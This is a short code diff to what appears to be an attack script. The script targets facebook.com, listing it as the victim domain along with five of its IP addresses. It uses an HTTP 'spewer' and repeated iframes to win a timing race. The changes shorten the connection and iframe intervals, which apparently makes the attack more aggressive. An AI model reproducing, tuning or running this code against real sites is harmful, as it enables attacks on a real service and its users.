@@ -80,7 +80,7 @@ VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them
 VICTIM_SITE_IPS = ['66.220.149.88', '66.220.158.11', '69.171.224.37', \
                     '69.171.229.11', '69.171.242.11']
 
-NEW_CONNECTION_PERIOD = 0.4
+NEW_CONNECTION_PERIOD = 0.1
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
@@ -179,7 +179,7 @@ class ControlWebSocket(Protocol):
         if (self.spewer_pid == None):
             self.spawnHTTPSpewer() 
         if (time.time() - self.last_init_iframe) < 60:
-            reactor.callLater(0.5, self.make_iframe)
+            reactor.callLater(0.25, self.make_iframe)
         else:
             # reset the whole thing, try again
             self.bucket = 0
